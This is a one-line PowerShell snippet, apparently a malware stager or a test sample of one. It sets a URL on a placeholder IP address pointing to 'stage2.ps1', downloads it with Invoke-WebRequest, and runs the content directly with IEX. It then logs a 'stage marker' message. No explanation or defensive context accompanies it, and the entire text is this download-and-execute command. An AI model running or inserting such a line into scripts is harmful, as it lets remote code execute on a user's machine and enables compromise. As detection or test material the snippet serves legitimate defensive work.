
<# Remote fetch #> $FetchUrl = 'http://192.0.2.160/stage2.ps1'; IEX (Invoke-WebRequest -Uri $FetchUrl -UseBasicParsing).Content; Write-Verbose "stage marker 9 reached"
